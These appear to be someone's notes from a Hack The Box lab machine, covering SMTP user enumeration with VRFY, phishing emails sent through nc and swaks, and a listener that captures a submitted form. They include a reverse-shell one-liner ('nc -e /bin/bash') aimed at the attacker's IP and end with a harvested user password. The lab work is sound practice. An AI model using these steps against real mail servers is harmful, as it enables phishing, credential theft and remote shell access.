add sneakycorp.htb to /etc/hosts with its ip address

verify emails exist using the port using:

```
nc 10.10.10.197 25
```
and then

```
vrfy laelgreer@sneakymailer.htb

```

try smtp enumeration using this: https://www.hackingarticles.in/4-ways-smtp-enumeration/ and fail
try sending mails using this syntax and try to get a reverse shell using ```nc -e /bin/bash yourip port (nc -vlp on the attacker side) ```

reverse shell doesnt work but putting nc on port 80 would make it a simple http request, and u can send it via browser and try sending it mails,
test it on ur local by oopening a browser and typing http://localhost


for sending emails use 
https://www.wikihow.com/Send-Email-Using-Telnet


tried the following and failed
```
nc 10.10.10.197 25
220 debian ESMTP Postfix (Debian/GNU)
MAIL FROM: laelgreer@sneakymailer.htb
250 2.1.0 Ok
RCPT TO: glorialittle@sneakymailer.htb
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
http://10.10.14.117

<CR><LF>.<CR><LF>

.
250 2.0.0 Ok: queued as E99702470F
quit
221 2.0.0 Bye
```


to see all available commnad use ehlo command at port 25
```

ehlo
501 Syntax: EHLO hostname
ehlo 10.10.10.197
250-debian
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```


https://linux.die.net/man/1/swaks
after that try using swaks and pray to science that all will be good.

using swaks like
```
swaks -to paulbyrd@sneakymailer.htb -server 10.10.10.197 -from glorialittle@sneakymailer.htb -body "http://10.10.14.117/"
```
didnt work the out put was crap


we finally created a custom shel script as in mailer.sh

run that with the cla as cewlmails.txt and  listen on port 80 with nc using ```nc -vlp 80```


once the script finishes u will get the following on the listener ``` firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt```

